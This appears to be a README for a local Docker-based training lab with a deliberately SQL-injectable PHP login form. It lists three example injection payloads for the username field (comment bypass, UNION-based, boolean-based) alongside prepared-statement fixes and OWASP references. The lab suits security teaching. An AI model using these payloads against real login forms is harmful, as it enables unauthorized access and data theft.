# SQL Injection Lab

## 📝 Description

This lab demonstrates a basic SQL Injection vulnerability in a PHP application. The application has a login form that is vulnerable to SQL injection attacks.

## 🎯 Impact

SQL Injection vulnerabilities can lead to:
- Unauthorized access to the application
- Data theft
- Database manipulation
- Server compromise

## 💡 Setup

1. Navigate to the vulnerable version:
```bash
cd vuln
docker-compose up
```

2. Access the application:
- Open your browser and go to `http://localhost:8080`
- Default credentials: admin/admin

## 🔧 Exploitation

1. Basic SQL Injection:
```
Username: admin' --
Password: anything
```

2. Union-based SQL Injection:
```
Username: ' UNION SELECT 1,1,1 FROM users --
Password: anything
```

3. Boolean-based SQL Injection:
```
Username: admin' AND '1'='1
Password: anything
```

## 🛡️ Fix

The fixed version implements:
- Prepared statements
- Input validation
- Parameterized queries
- Error handling

## 📚 Resources

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PHP PDO Tutorial](https://www.php.net/manual/en/pdo.prepared-statements.php) 